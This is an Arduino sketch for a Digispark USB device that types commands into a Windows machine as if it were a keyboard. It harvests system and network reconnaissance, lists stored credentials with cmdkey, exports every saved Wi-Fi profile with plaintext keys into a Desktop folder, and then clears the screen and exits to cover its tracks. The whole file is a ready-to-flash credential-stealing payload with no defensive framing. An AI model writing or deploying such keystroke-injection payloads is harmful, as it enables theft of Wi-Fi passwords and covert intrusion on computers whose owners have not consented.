#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);


  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);


  DigiKeyboard.print(F("set P=%userprofile%\\Desktop\\Log"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  

  DigiKeyboard.print(F("md \"%P%\" & md \"%P%\\Sys\" & md \"%P%\\Net\" & md \"%P%\\Wifi\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  
  DigiKeyboard.print(F("wmic logicaldisk get caption,size,freespace > \"%P%\\Sys\\Disk.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(300);
  
  DigiKeyboard.print(F("wmic memorychip get capacity,speed > \"%P%\\Sys\\RAM.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(300);

  DigiKeyboard.print(F("wmic cpu get name,numberofcores > \"%P%\\Sys\\CPU.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  DigiKeyboard.print(F("net user > \"%P%\\Sys\\User.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("net localgroup administrators > \"%P%\\Sys\\Admin.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("cmdkey /list > \"%P%\\Sys\\Creds.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  DigiKeyboard.print(F("tasklist /v > \"%P%\\Sys\\Proc.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print(F("wmic startup get caption,command > \"%P%\\Sys\\Start.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.delay(1000); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  DigiKeyboard.print(F("wmic service get name,state,startmode > \"%P%\\Sys\\Svc.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  DigiKeyboard.print(F("set > \"%P%\\Sys\\Env.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.print(F("reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s | findstr \"FriendlyName\" > \"%P%\\Sys\\USB.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr \"DisplayName\" > \"%P%\\Sys\\Soft.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  DigiKeyboard.print(F("systeminfo > \"%P%\\Sys\\OS.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(8000);

  DigiKeyboard.print(F("ipconfig /all > \"%P%\\Net\\IP.txt\" & ipconfig /displaydns > \"%P%\\Net\\DNS.txt\" & arp -a > \"%P%\\Net\\ARP.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print(F("route print > \"%P%\\Net\\Route.txt\" & netstat -ano > \"%P%\\Net\\Ports.txt\" & net share > \"%P%\\Net\\Share.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print(F("netsh advfirewall show allprofiles > \"%P%\\Net\\FW.txt\" & type C:\\Windows\\System32\\drivers\\etc\\hosts > \"%P%\\Net\\Hosts.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("netsh wlan show networks mode=bssid > \"%P%\\Wifi\\Scan.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print(F("netsh wlan show all > \"%P%\\Wifi\\Rep.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("FOR /F \"skip=9 tokens=*\" %A IN ('NETSH WLAN SHOW PROFILES') DO FOR /F \"tokens=2 delims=:\" %B IN (\"%A\") DO FOR /F \"tokens=*\" %C IN (\"%B\") DO NETSH WLAN EXPORT PROFILE name=\"%C\" folder=\"%P%\\Wifi\" key=clear"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  DigiKeyboard.print(F("cls"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}